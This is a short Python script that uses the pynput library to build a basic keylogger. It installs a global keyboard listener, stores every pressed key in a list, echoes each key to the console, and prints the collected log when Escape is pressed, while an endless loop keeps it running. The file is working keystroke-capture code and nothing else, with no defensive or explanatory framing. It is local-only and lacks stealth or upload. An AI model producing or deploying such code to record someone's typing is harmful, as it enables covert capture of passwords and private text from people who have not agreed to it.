from time import sleep
from pynput import keyboard

keylog = []

def on_press(key):
    try:
        if(key == keyboard.Key.esc):
            print(str(keylog))
        print(str(key.char))
        keylog.append(str(key.char))
    except AttributeError:
        print(str(key)[4:])
        keylog.append(str(key)[4:])

listener = keyboard.Listener(on_press=on_press)
listener.start()

while True:
    sleep(10)
